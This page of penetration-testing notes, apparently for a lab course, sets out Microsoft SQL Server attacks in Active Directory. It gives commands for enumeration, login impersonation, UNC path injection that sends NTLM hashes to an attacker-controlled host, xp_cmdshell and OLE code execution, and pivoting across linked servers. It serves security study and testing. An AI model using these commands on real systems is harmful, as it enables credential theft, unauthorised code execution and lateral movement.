---
layout: page
title: "MSSQL Attacks"
---

# MSSQL Attacks

MSSQL integrates with Active Directory through service accounts and SPNs. Any domain user can typically authenticate with Windows auth (Kerberos), which makes MSSQL a consistent lateral movement and escalation vector even without stolen credentials.

## Enumeration

```powershell
# Find MSSQL instances via SPN query (domain-joined Windows)
setspn -T corp1 -Q MSSQLSvc/*

# PowerView
powershell -ep bypass
. .\powerview.ps1
Get-DomainComputer -SPN "MSSQLSvc*" | select dnshostname, serviceprincipalname
```

```shell
# PowerUpSQL (from domain context)
Import-Module .\PowerUpSQL.ps1
Get-SQLInstanceDomain
Get-SQLInstanceDomain | Get-SQLConnectionTest
Get-SQLInstanceDomain | Get-SQLServerInfo
```

```shell
# Nmap: default port
nmap -p 1433 --open 192.168.1.0/24
```

## Authentication

```shell
# Windows auth from Kali (Kerberos)
impacket-mssqlclient corp1/offsec:lab@dc01.corp1.com -windows-auth

# SQL auth
impacket-mssqlclient sa:password@192.168.1.10

# From domain-joined Windows (Kerberos transparent)
sqlcmd -S dc01.corp1.com -Q "SELECT SYSTEM_USER"
```

## Privilege Enumeration

```sql
-- Current login and role
SELECT SYSTEM_USER;
SELECT IS_SRVROLEMEMBER('sysadmin');
SELECT IS_SRVROLEMEMBER('public');

-- Who can be impersonated
SELECT DISTINCT b.name
FROM sys.server_permissions a
INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id
WHERE a.permission_name = 'IMPERSONATE';
```

## Privilege Escalation via Impersonation

```sql
-- Impersonate sa login (if permission exists)
EXECUTE AS LOGIN = 'sa';
SELECT SYSTEM_USER;

-- Impersonate dbo user in msdb (requires TRUSTWORTHY db)
USE msdb;
EXECUTE AS USER = 'dbo';
SELECT USER_NAME();
SELECT IS_SRVROLEMEMBER('sysadmin');
```

## UNC Path Injection (Capture NTLM Hash)

```sql
-- Trigger outbound SMB to responder
EXEC master..xp_dirtree '\\192.168.45.10\test';
EXEC master..xp_fileexist '\\192.168.45.10\test';
```

```shell
# Kali: capture the hash
sudo responder -I eth0 -v
# or
sudo impacket-ntlmrelayx -t smb://target -smb2support
```

## Code Execution (xp_cmdshell)

```sql
-- Enable xp_cmdshell (requires sysadmin)
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;

-- Execute OS commands
EXEC xp_cmdshell 'whoami';
EXEC xp_cmdshell 'powershell -enc <base64>';
```

```sql
-- Alternative: OLE Automation
EXEC sp_configure 'Ole Automation Procedures', 1; RECONFIGURE;

DECLARE @shell INT;
EXEC sp_OACreate 'wscript.shell', @shell OUTPUT;
EXEC sp_OAMethod @shell, 'run', null, 'cmd /c powershell -enc <base64>';
```

## Linked SQL Servers

```sql
-- Enumerate linked servers
SELECT name, data_source FROM sys.servers WHERE is_linked = 1;
EXEC sp_linkedservers;

-- Query linked server
SELECT * FROM OPENQUERY(appsrv01, 'SELECT SYSTEM_USER');
SELECT * FROM OPENQUERY(appsrv01, 'SELECT IS_SRVROLEMEMBER(''sysadmin'')');

-- Execute on linked server
EXEC ('xp_cmdshell ''whoami''') AT appsrv01;

-- Chain through multiple links
SELECT * FROM OPENQUERY(appsrv01, 'SELECT * FROM OPENQUERY(db02, ''SELECT SYSTEM_USER'')');
```

## PowerUpSQL One-Liners

```powershell
# Test access
Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded | Where-Object {$_.Status -eq "Accessible"}

# Enumerate sysadmin accounts
Get-SQLInstanceDomain | Get-SQLServerInfo | Select-Object ComputerName, CurrentLogin, IsSysadmin

# Auto-escalate and execute
Invoke-SQLAudit -Instance dc01.corp1.com
Invoke-SQLEscalatePriv -Instance dc01.corp1.com -Verbose

# Execute OS command
Invoke-SQLOSCmd -Instance dc01.corp1.com -Command "whoami" -RawResults
```
